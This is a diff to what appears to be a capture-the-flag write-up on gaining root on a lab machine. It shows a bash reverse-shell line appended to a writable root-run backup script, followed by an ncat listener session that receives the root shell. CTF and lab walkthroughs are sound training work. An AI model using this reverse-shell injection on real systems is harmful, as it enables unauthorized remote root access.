@@ -326,11 +326,18 @@ The script is a backup script so it probably runs every once and a while.
 As I can edit the file I can echo reverse shell into the file(or use nano etc.).
 "echo "/bin/bash -i >& /dev/tcp/10.10.10.10/1234 0>&1" >> /usr/local/bin/main_backup.sh"
 
-I can then start a ncat listener with "ncat -lvnp 1234" and should get a reverse shell as a root user!
+I can then start a ncat listener and should get a reverse shell as a root user!
 -----
-root@TEAM:~# id
-id
-uid=0(root) gid=0(root) groups=0(root),1004(admin)
+kali@kali:~$ ncat -lvnp 1234
+Ncat: Version 7.94 ( https://nmap.org/ncat )
+Ncat: Listening on [::]:1234
+Ncat: Listening on 0.0.0.0:1234
+Ncat: Connection from 10.10.28.97:50120.
+bash: cannot set terminal process group (1384): Inappropriate ioctl for device
+bash: no job control in this shell
+root@TEAM:~# whoami
+whoami
+root
 root@TEAM:~#
 -----
 
